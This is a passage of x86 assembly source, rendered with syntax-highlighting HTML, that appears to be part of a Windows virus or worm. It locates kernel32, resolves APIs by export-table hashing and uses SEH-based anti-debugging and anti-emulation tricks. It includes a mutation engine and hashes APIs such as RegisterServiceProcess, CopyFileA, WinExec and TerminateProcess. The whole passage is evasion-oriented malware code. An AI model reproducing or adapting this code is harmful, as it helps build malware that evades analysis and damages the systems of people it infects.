</span><span class="sc5">_krnl_check</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; gotta set ecx so that we can return true</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__temp</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.EH_EstablisherFrame</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; set SEH manually</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__end_k</span><span class="sc0">

</span><span class="sc5">__temp</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; take RVA to PE header</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; check PE signature</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'SUN'</span><span class="sc0">              </span><span class="sc1">; indirectly</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'SUN'</span><span class="sc0">   </span><span class="sc1">; lil sig</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__end_k</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">ecx.NT_OptionalHeader.OH_ImageBase</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; check the predefined imagebase</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__end_k</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;no kernel for us :(</span><span class="sc0">

</span><span class="sc5">__end_k</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">

</span><span class="sc5">__end</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; searches for the address of specified API by export table scanning</span><span class="sc0">
</span><span class="sc1">; i: ebx = dll imagebase</span><span class="sc0">
</span><span class="sc1">;    TOS = API hash</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: eax = API's address, 0 on error</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">load_dll_address</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__seh_init</span><span class="sc0">              </span><span class="sc1">; setup SEH manually</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.EH_EstablisherFrame</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__end</span><span class="sc0">
            
</span><span class="sc5">__seh_init</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; take RVA of PE header</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__err</span><span class="sc0">                   </span><span class="sc1">; check whether there is export directory RVA</span><span class="sc0">

            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; if so, normalize with imagebase</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">; initialize counter</span><span class="sc0">
</span><span class="sc5">__k_l</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; take ptr to array of ptrs to functions names</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; take RVA of ptr to name of the API</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; normalize</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; initialize hash</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc5">eax.TEB_ClientId.CID_UniqueProcess</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; anti-debugging</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                  </span><span class="sc1">; hash algo starts here. (x) by z0mbie</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; next letter</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; end of name?</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">                 </span><span class="sc1">; nope, repeat again</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.Arg1.cPushad</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; compare it with given hash; skip pushad+SEH+call+param</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__bingo</span><span class="sc0">                 </span><span class="sc1">; yippie</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; counter++</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.ED_NumberOfNames</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; compare counter with the number of exported functions</span><span class="sc0">
            </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">__k_l</span><span class="sc0">                   </span><span class="sc1">; if below, repeat it</span><span class="sc0">

</span><span class="sc5">__err</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; either exception occured, or we didn't find API. either way, set return value to false</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__end</span><span class="sc0">

</span><span class="sc5">__bingo</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.ED_AddressOfOrdinals</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; take RVA to array of API ordinals</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; normalize</span><span class="sc0">
            </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; x2 coz its an array of WORDs</span><span class="sc0">
            </span><span class="sc1">;sub    edx, [ecx.ED_BaseOrdinal]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; take RVA of an array of APIs addresses</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; normalize</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; x4 coz its an array of DWORDs</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; normalize</span><span class="sc0">

</span><span class="sc5">__end</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">                </span><span class="sc1">; remove SEH frame</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; set return address</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pshd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">              </span><span class="sc1">; anti-emu</span><span class="sc0">
            </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; caculates CRC32</span><span class="sc0">
</span><span class="sc1">; i: edx = ptr to array</span><span class="sc0">
</span><span class="sc1">;    ecx = length in bytes</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: eax = CRC32</span><span class="sc0">
</span><span class="sc1">;    edx += ecx</span><span class="sc0">
</span><span class="sc1">;    ecx = 0</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">CRC32</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__4</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">__3</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDB88320h</span><span class="sc0">
</span><span class="sc5">__3</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__2</span><span class="sc0">

            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__1</span><span class="sc0">
            
            </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">__4</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">kme_start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">..</span><span class="sc0">\</span><span class="sc5">kme</span><span class="sc0">\</span><span class="sc5">kme.asm</span><span class="sc0">
</span><span class="sc5">kme_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">hash_table_kernel32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">OpenMutexA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SetErrorMode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HeapCreate</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegisterServiceProcess</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ExpandEnvironmentStringsA</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GetModuleFileNameA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WaitForMultipleObjects</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">TerminateThread</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">ExitThread</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetLastError</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CreateMutexA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CompareStringA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CreatePipe</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PeekNamedPipe</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">WinExec</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MoveFileA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DeleteFileA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetExitCodeProcess</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HeapAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HeapFree</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HeapDestroy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CreateProcessA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RemoveDirectoryA</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">CreateDirectoryA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FindClose</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetVersion</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">GetComputerNameA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CreateToolhelp32Snapshot</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Process32First</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Process32Next</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OpenProcess</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">TerminateProcess</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetCurrentProcessId</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirtualAlloc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetCommandLineA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FreeLibrary</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">address_table_kernel32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_OpenMutexA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CloseHandle</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_SetErrorMode</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_HeapCreate</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_RegisterServiceProcess</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_ExpandEnvironmentStringsA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetModuleFileNameA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CopyFileA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_Sleep</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_WaitForMultipleObjects</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_TerminateThread</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CreateThread</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_ExitThread</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetLastError</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CreateMutexA</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetTickCount</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CompareStringA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CreatePipe</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_PeekNamedPipe</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_WinExec</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_WriteFile</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CreateFileA</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_MoveFileA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_DeleteFileA</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetExitCodeProcess</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_ReadFile</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_SetCurrentDirectoryA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_HeapAlloc</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_HeapFree</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_HeapDestroy</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CreateProcessA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_RemoveDirectoryA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CreateDirectoryA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_FindFirstFileA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_FindNextFileA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_FindClose</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetVersion</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetComputerNameA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetFileSize</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CreateToolhelp32Snapshot</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_Process32First</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_Process32Next</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_OpenProcess</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_TerminateProcess</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetCurrentProcessId</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_VirtualAlloc</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetCommandLineA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetModuleHandleA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_FreeLibrary</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
